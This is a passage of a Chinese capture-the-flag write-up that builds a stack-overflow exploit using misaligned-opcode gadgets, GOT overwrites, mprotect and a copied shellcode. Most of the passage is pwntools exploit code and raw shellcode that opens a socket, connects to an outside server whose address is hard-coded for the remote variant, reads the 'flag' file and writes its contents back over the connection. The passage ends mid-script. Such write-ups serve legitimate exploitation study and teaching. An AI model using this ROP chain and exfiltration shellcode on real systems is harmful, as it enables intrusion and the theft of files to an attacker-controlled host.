-<p>现在看一下ida正常的两个指令，以及他们对应的十六进制机器码<img src="/../img/2706180-20220426102025440-653483116.png"><br><img src="/../img/2706180-20220426102033744-1476514134.png"></p>
-<p><img src="/../img/2706180-20220426102057610-1265266427.png"></p>
-<p><img src="/../img/2706180-20220426102206921-1073508038.png"></p>
-<p>发现将机器码再转成汇编，确实是原来的指令。不过我们现在去拿01 5d c3这段机器码（也就是上面两个指令之间的一部分）去得到我们想要的magic gadget（如下图）<br><img src="/../img/2706180-20220426102217546-987677091.png"></p>
-<p><strong>理论上这个gadget在每个64位程序都存在（不过需要机器码错位得到）</strong>。</p>
-<p>需要的时候，直接用Ropgadget搜这个机器码就可以了。（参数是opcode)<br><img src="/../img/2706180-20220426102225206-1415630040.png"></p>
-<h3 id="怎么理解这个错位得到的机器码？"><a href="#怎么理解这个错位得到的机器码？" class="headerlink" title="怎么理解这个错位得到的机器码？"></a>怎么理解这个错位得到的机器码？</h3><p><img src="/../img/2706180-20220426102239185-1717796383.png"></p>
-<p>观察上图，很容易就会有一个问题，CPU如何知道这个机器指令的长度？</p>
-<p>其实啊，每个指令由操作码和操作数两部分组成，CPU设计好的时候，指令集就已经确定了，CPU对每条指令都规定了对应的机器码，<strong>CPU刚开始读取指令的时候，并不知道这个指令的长度，不过它会先读取操作码，读完操作码之后，它就知道这个指令应该是多长了，从而再去读对应字节的操作数</strong>。</p>
-<p>这样再理解错位机器码的时候就很容易了，CPU面对的只有二进制01（上面写成十六进制是方便理解），只要你能确保你想要的指令是存在于代码段的，尽管他们在ida里是看不到的。却依然可以去拿这个指令去执行，<strong>因为CPU并不会去检查你这个指令是否是程序中正常的指令，即使你是错位得到的</strong>。</p>
-<h2 id="一个字节太多的payload"><a href="#一个字节太多的payload" class="headerlink" title="一个字节太多的payload"></a>一个字节太多的payload</h2><p>现在也有了syscall，那按理说可以去进行系统调用socket和connect了吧？<br><img src="/../img/2706180-20220426102259813-2020062452.png"></p>
-<p>也没有rax…，程序里也没有任何与rax有关的指令。</p>
-<p>但是libc里啥都有，因此我们的对策是在libc里找到pop rax ; ret指令，然后将其覆写到无用函数的got表里。</p>
-<p>继续采用magic gadget。大致思路就是去拿到libc中无用函数的偏移再拿到libc中pop rax;ret的偏移，然后计算二者偏移放入ebx，然后rbp-0x3d写入无用函数的got地址，执行magic gadget即可。去libc中找函数偏移的时候踩了个坑，在文末记录了一下。</p>
-<p>接着思路就很简单了，用magic gadget凭空造出来我们需要的东西，然后去用ret2syscall的手法来执行socket+connect+open+read+write函数即可。真的这么简单么？ 我们似乎忘记了，这道题是有溢出限制的。0x1b0个字节的溢出，看起来很多，但是真正实现起来刚才的思路会发现溢出远远不够。</p>
-<p>下面是上面思路所对应的exp（不想仔细研究的可以不研究，毕竟这个不是本题正确的exp，只是放一下上面思路的exp（这个如果溢出足够的话，这个exp是可以打通的））</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">alarm_plt_addr=e.plt[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">alarm_got_addr=e.got[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">close_got_addr=e.got[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">close_plt_addr=e.plt[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">prctl_got_addr=e.got[<span class="string">&#x27;prctl&#x27;</span>]</span><br><span class="line">prctl_plt_addr=e.plt[<span class="string">&#x27;prctl&#x27;</span>]</span><br><span class="line">read_got_addr=e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x40086A</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400903</span></span><br><span class="line">pop_rsi_r15_addr=<span class="number">0x400901</span></span><br><span class="line">bss_addr=<span class="number">0x601100</span></span><br><span class="line">magic_gadget_addr=<span class="number">0x400618</span></span><br><span class="line">gadget=<span class="number">0x4008fa</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#此时在将flag写入bss段</span></span><br><span class="line">payload=<span class="number">16</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(gadget)</span><br><span class="line">payload+=<span class="string">&#x27;flag\x00\x00\x00\x00&#x27;</span><span class="comment">#这里即使最后ebx只能传送前四字节，但依然要用\x00来补齐</span></span><br><span class="line"><span class="comment"># 不然会导致后面地址与flag会在同一个内存单元</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#此时在将sockaddr结构写入bss段</span></span><br><span class="line"><span class="comment"># 127.0.0.1 1000 其中0100007f为127.0.0.1 e803 为03e8即1000，0002为AF_INET</span></span><br><span class="line"><span class="comment">#下面两部分，是在凑齐p64(0x0100007fe8030002),因为ebp一次只能传四字节，因此要传两次</span></span><br><span class="line"><span class="comment">#这个回环地址可以改成⾃⼰的服务器的ip端⼝（以此在比赛当做拿到远程的flag）</span></span><br><span class="line">payload+=p64(gadget)</span><br><span class="line">payload+=p64(<span class="number">0xe8030002</span>)<span class="comment">#同上，即使最后ebx只传送四字节，但依然要用p64来放到栈里，用来保持一个完整的内存单元</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">8</span>+<span class="number">0x3d</span>)<span class="comment">#这里加8是要跳过flag所处的整个内存单元</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line">payload+=p64(gadget)</span><br><span class="line">payload+=p64(<span class="number">0x0100007f</span>)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">12</span>+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改alarm的got表为syscall地址</span></span><br><span class="line">payload+=p64(gadget)</span><br><span class="line">payload+=p64(<span class="number">0x5</span>)</span><br><span class="line">payload+=p64(alarm_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#prctl libc偏移0x122210</span></span><br><span class="line"><span class="comment">#pop_rax_pop_rdx_pop_rbx的偏移为0x166241</span></span><br><span class="line"><span class="comment">#执行完下面的内容之后，prctl函数的got表装的是pop_rax_pop_rdx_pop_rbx ; ret</span></span><br><span class="line">payload+=p64(<span class="number">0x4008da</span>)</span><br><span class="line">payload+=p64(<span class="number">0x44031</span>)</span><br><span class="line">payload+=p64(prctl_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x400618</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接下来执行的内容是</span></span><br><span class="line"><span class="comment">#socket(2,1,0)</span></span><br><span class="line"><span class="comment">#connect(0,socket_struct_addr,0x8)</span></span><br><span class="line"><span class="comment">#open(flag_addr,0)</span></span><br><span class="line"><span class="comment">#read(1,bss_addr+400,0x30)</span></span><br><span class="line"><span class="comment">#write(0,bss_addr+400,0x30)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#socket(2,1,0)ipv6,面向连接的套接字,tcp传输协议</span></span><br><span class="line">payload+=p64(pop_rdi_addr)</span><br><span class="line">payload+=p64(<span class="number">2</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_addr)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(prctl_plt_addr)<span class="comment">#pop_rax_pop_rdx_pop_rbx ; ret</span></span><br><span class="line">payload+=p64(<span class="number">0x29</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx无用寄存器</span></span><br><span class="line">payload+=p64(alarm_plt_addr)<span class="comment">#syscall</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#connect(soc,struct_socket_addr,sizeof(struct_socket)</span></span><br><span class="line"><span class="comment">#调试socket发现，执行之后，然后的rax值是0，因此connect的rdi为0</span></span><br><span class="line">payload+=p64(pop_rdi_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_addr)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x8</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15无用寄存器</span></span><br><span class="line">payload+=p64(prctl_plt_addr)</span><br><span class="line">payload+=p64(<span class="number">42</span>)</span><br><span class="line">payload+=p64(<span class="number">16</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx无用寄存器</span></span><br><span class="line">payload+=p64(alarm_plt_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#open(flag_addr,0)</span></span><br><span class="line">payload+=p64(pop_rdi_addr)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=p64(pop_rsi_r15_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#15无用寄存器</span></span><br><span class="line">payload+=p64(prctl_plt_addr)</span><br><span class="line">payload+=p64(<span class="number">2</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rdx无用寄存器</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx无用寄存器</span></span><br><span class="line">payload+=p64(alarm_plt_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(open_return_value,bss+400,0x30)</span></span><br><span class="line">payload+=p64(pop_rdi_addr)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_addr)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">400</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15无用寄存器</span></span><br><span class="line">payload+=p64(prctl_plt_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x30</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx无用寄存器</span></span><br><span class="line">payload+=p64(alarm_plt_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write(0,bss_addr+400,0x30)</span></span><br><span class="line">payload+=p64(pop_rdi_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_addr)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">400</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15无用寄存器</span></span><br><span class="line">payload+=p64(prctl_plt_addr)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(<span class="number">0x30</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx无用寄存器</span></span><br><span class="line">payload+=p64(alarm_plt_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="/../img/2706180-20220426102311543-185742101.png"></p>
-<p>发现现在的payload是0x2e0…  因此还要换一下方法，大致思路没问题，但是现在要考虑的是怎么让payload更短，其实观察一下上面的payload就会发现很多字节其实都是被浪费掉了，因为p64()打包就填充了非常多的0（如下图）<br><img src="/../img/2706180-20220426102321696-469048676.png"></p>
-<h2 id="试着使用shellcode？"><a href="#试着使用shellcode？" class="headerlink" title="试着使用shellcode？"></a>试着使用shellcode？</h2><p>如果我们可以执行对应汇编指令的机器码，并且我们直接将对应的机器码发过去，那岂不是就把p64打包出现很多00的问题给解决了么。</p>
-<p>想执行shellcode其实也非常简单，只需要执行mprotect这个函数把一页内存属性给改成可读可写可执行就ok了。也就是说我们不再去用ret2syscall的手法布置rop链了，先去执行mprotect，然后将我们栈中布置的shellcode拷贝到bss段，最后执行shellcode。</p>
-<p>不过随之产生了几个问题</p>
-<blockquote>
-<p>1、为什么要把shellcode拷贝到bss段？</p>
-<p>答：由于栈基址随机化，我们无法用mprotect函数准确的改变栈的属性，但是bss段的地址是确定的，因此可以使用mprotect函数修改bss段属性，然后只需要将shellcode迁移到bss段即可。</p>
-<p>2、怎么将shellcode拷贝到bss段？</p>
-<p>利用rep movs qword ptr [rdi],qword ptr[rsi] ; ret指令，<strong>这个指令就是将rsi指向的内容赋给rdi指向的内容</strong>，同时执行完毕后rsi和rdi会自动增加，指向下一个内存单元，不断循环该过程，循环的次数由rcx寄存器的值决定（每次减1，减到0为止）</p>
-<p>3、怎么将执行流劫持到bss段？</p>
-<p>hh,这个问题想解决的话，要去调试，最后我解释一下。</p>
-</blockquote>
-<h1 id="正文开始——构造正确的exp"><a href="#正文开始——构造正确的exp" class="headerlink" title="正文开始——构造正确的exp"></a>正文开始——构造正确的exp</h1><p>四千字了…  现在才来到了如何构建本题正确的exp</p>
-<p>第一件事，我们需要造一个mprotect函数。我们采用的方法是用magic_gadget将alarm函数的got表修改为mprotect函数的真实地址。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload+=p64(csu_gadget1)</span><br><span class="line">payload+=p64(mprotect_offsetalarm_offset)+p64(alarm_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br></pre></td></tr></table></figure>
-
-<p>现在想控制rbx和rbp的话只能执行csu片段，不过这个缺点非常明显，直接填充了32字节的垃圾数据，但是没办法，暂时只能用csu片段来控制rbx和rbp。</p>
-<p>第二件事，就是执行mprotect函数，只有改变了bss段的内存属性，我们才可以做更多的事情。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload+=p64(csu_gadget1)<span class="comment">#执行csu片段传参，这没什么好说的</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(alarm_got_addr)</span><br><span class="line">payload+=p64(bss_ye)<span class="comment">#这个就是映射到bss的内存页地址</span></span><br><span class="line">payload+=p64(<span class="number">0x100000</span>)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(csu_gadget2)</span><br></pre></td></tr></table></figure>
-
-<p>此时的bss段已经变成了可读可写可执行（如下图）</p>
-<p><img src="/../img/2706180-20220426103623192-486607434.png"></p>
-<p>那我们现在要立刻造出来pop_rbx_pop_rbp_ret这个指令，因为我们接下来还要用几次magic_gadget，但是不能每次使用都执行一次csu片段吧，这样的话肯定最后的payload会超长。造这个指令很简单，因为bss段已经可执行（<strong>就是我们往bss段写的内容都可以被当做指令来用</strong>），有什么好说的，直接把需要造的指令对应机器码写到bss段上（上文已经提过利用magic_gadget往bss段写入数据了）</p>
-<p>这个网站可以在线汇编指令转机器码   <a href="(https://defuse.ca/online-x86-assembler.htm#disassembly)">here</a></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#往bss_addr+0x10写入pop rbx;pop rbp;pop rcx;ret</span></span><br><span class="line"><span class="comment">#5B5D59C3为pop rbx;pop rbp;pop rcx;ret的机器码，由于p64()打包会将数据进行小端序处理，因此我们需要提前手动小端序处理一次，以来确保指令是正常顺序存入bss段的</span></span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0xc3595d5b</span>)+p64(bss_addr+<span class="number">0x10</span>+<span class="number">0x3d</span>)</span><br><span class="line">payload+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br></pre></td></tr></table></figure>
-
-<p>此时我们再执行magic_gadget就可以直接用bss_addr+0x10中存放的pop rbx;pop rbp;pop rcx;ret（至于为什么还要pop rcx，因为这样会更省字节，后面就不用专门造一个pop rcx;ret指令了）</p>
-<p>接着我们需要再造两个指令，分别是:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rep movs qword ptr [rdi],qword ptr[rsi] ; ret #F348A5C3 </span><br><span class="line">mov rsi,rsp;ret #4889E6C3</span><br></pre></td></tr></table></figure>
-
-<p>第一个很好理解，是负责拷贝的rep，可是为什么要用第二个指令呢？考虑一下我们使用rep的时候怎么去控制这个rsi,我们本来是控制不了，并且我们还需要这个rsi指向当前栈顶的内容（因为rep指令下面就是shellcode了），因此才需要造一个这个gadget出来。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#往bss_addr写入 rep movs qword ptr [rdi],qword ptr[rsi] ; ret</span></span><br><span class="line"></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#现在bss_addr+0x10就相当于pop rbx;pop rbp;pop rcx;ret这个指令了</span></span><br><span class="line">payload+=p64(<span class="number">0xc3a548f3</span>)+p64(bss_addr+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#往bss段+0x8写入mov rsi,rsp;ret</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(<span class="number">0xc3e68948</span>)+p64(bss_addr+<span class="number">0x8</span>+<span class="number">0x3d</span>)+p64(<span class="number">15</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br></pre></td></tr></table></figure>
-
-<p>至此所有准备工作完成，我们接下来就是执行rep指令并且布置shellcode了</p>
-<p>shellcode如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#socket(2,1,0)</span><br><span class="line">push 2</span><br><span class="line">pop rdi</span><br><span class="line">push 1</span><br><span class="line">pop rsi</span><br><span class="line">psuh 0</span><br><span class="line">pop rdx</span><br><span class="line">push 41</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">#connect(0,socket_struct_addr,0x8)</span><br><span class="line">push 0</span><br><span class="line">pop rdi</span><br><span class="line">mov rcx,0x13589c5282230002 #如果打本地的话，这里改成0x0100007fe8030002 对应的ip和端口为127.0.0.1 1000</span><br><span class="line">#push没法直接压入0x13589c5282230002，只能通过寄存器中转</span><br><span class="line">push rcx </span><br><span class="line">mov rsi,rsp</span><br><span class="line">push 0x10</span><br><span class="line">pop rdx</span><br><span class="line">push 42</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">#open(flag_addr,0)</span><br><span class="line">push 0x67616c66</span><br><span class="line">mov rdi,rsp#本来这里为了更短应该使用push rsp;pop rdi的，但是不知道为啥，这回程序这么写就会直接崩溃，不过好在溢出卡的不死，也不差这几个字节</span><br><span class="line">push 0</span><br><span class="line">pop rsi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">#read(1,0x601500,0x50)</span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">mov rsi,0x601500</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 0</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">#write(0,0x601500,0x50)</span><br><span class="line">push 0</span><br><span class="line">pop rdi</span><br><span class="line">mov rsi,0x601500</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-
-<p>把上述shellcode全部转成机器码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socket=&quot;\x60\x11\x60\x00\x00\x00\x00\x00\x6A\x02\x5F\x6A\x01\x5E\x6A\x00\x5A\x6A\x29\x58\x0F\x05&quot;</span><br><span class="line"></span><br><span class="line">connect=&quot;\x6A\x00\x5F\x48\xB9\x02\x00\x03\xE8\x7F\x00\x00\x01\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05&quot;</span><br><span class="line"></span><br><span class="line">orw=&quot;\x68\x66\x6C\x61\x67\x48\x89\xE7\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x6A\x01\x5F\x48\xC7\xC6\x00\x15\x60\x00\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x00\x5F\x48\xC7\xC6\x00\x15\x60\x00\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span><br></pre></td></tr></table></figure>
-
-<p>最后的payload执行下rep指令再布置下shellcode</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload+=p64(pop_rdi_addr)+p64(bss_addr+<span class="number">0x50</span>)<span class="comment">#把shellcode布置到bss_addr加0x50的地方</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x8</span>)<span class="comment">#把rsp的值给rsi，也就是说rsi值为下面这个bss_addr所对应的栈地址</span></span><br><span class="line">payload+=p64(bss_addr)<span class="comment">#执行rep指令，至此拷贝开始</span></span><br></pre></td></tr></table></figure>
-
-<p>最后再回答一下当时问的怎么将执行流劫持到bss段上。</p>
-<p>通过调试发现，拷贝的时候只有rsi和rdi在移动，而rsp始终没有变，因此我只需要在发送shellcode之前放一个bss段地址（这个地址要执行shellcode的首地址），在payload的最后加上一个ret即可完成劫持执行流。</p>
-<p><img src="/../img/2706180-20220426103703621-1232925873.png"></p>
-<h1 id="完整exp："><a href="#完整exp：" class="headerlink" title="完整exp："></a>完整exp：</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;47.97.127.1&quot;,26417)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret_addr=<span class="number">0x4004e6</span></span><br><span class="line">magic_gadget_addr=<span class="number">0x400618</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400903</span></span><br><span class="line">pop_rsi_r15_addr=<span class="number">0x400901</span></span><br><span class="line">rdx_offset=<span class="number">0x1b96</span></span><br><span class="line">mprotect_offset=<span class="number">0x11b7e0</span></span><br><span class="line">alarm_offset=<span class="number">0xe44f0</span></span><br><span class="line">close_offset=<span class="number">0x110870</span></span><br><span class="line">prctl_offset=<span class="number">0x122210</span></span><br><span class="line">read_offset=<span class="number">0x110020</span></span><br><span class="line">csu_gadget1=<span class="number">0x4008FA</span></span><br><span class="line">csu_gadget2=<span class="number">0x4008E0</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400645</span></span><br><span class="line">term_hook=<span class="number">0x600e48</span></span><br><span class="line">alarm_got_addr=e.got[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">alarm_plt_addr=e.plt[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">prctl_got_addr=e.got[<span class="string">&#x27;prctl&#x27;</span>]</span><br><span class="line">prctl_plt_addr=e.plt[<span class="string">&#x27;prctl&#x27;</span>]</span><br><span class="line">close_got_addr=e.got[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">close_plt_addr=e.plt[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">read_plt_addr=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got_addr=e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rax_offset=<span class="number">0x24ad4</span></span><br><span class="line">pop_rdx_offset=<span class="number">0x1b96</span></span><br><span class="line">rep_offset=<span class="number">0x3f84a</span></span><br><span class="line">bss_addr=<span class="number">0x601100</span></span><br><span class="line">bss_ye=<span class="number">0x601000</span></span><br><span class="line">mov_rdi_rsp_offset=<span class="number">0x15c2fe</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#socket(2,1,0)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">psuh 0</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 41</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">socket=<span class="string">&quot;\x60\x11\x60\x00\x00\x00\x00\x00\x6A\x02\x5F\x6A\x01\x5E\x6A\x00\x5A\x6A\x29\x58\x0F\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#connect(0,socket_struct_addr,0x8)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rcx,0x13589c5282230002</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 0x10</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 42</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="comment">#connect=&quot;\x6A\x00\x5F\x48\xB9\x02\x00\x23\x82\x52\x9C\x58\x13\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#local</span></span><br><span class="line">connect=<span class="string">&quot;\x6A\x00\x5F\x48\xB9\x02\x00\x03\xE8\x7F\x00\x00\x01\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05&quot;</span></span><br><span class="line"><span class="comment">#open(flag_addr,0)</span></span><br><span class="line"><span class="comment">#read(1,0x601500,0x50)</span></span><br><span class="line"><span class="comment">#write(0,0x601500,0x50)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rsi,0x601500</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rsi,0x601500</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#mov rsi,0x601500</span></span><br><span class="line">orw=<span 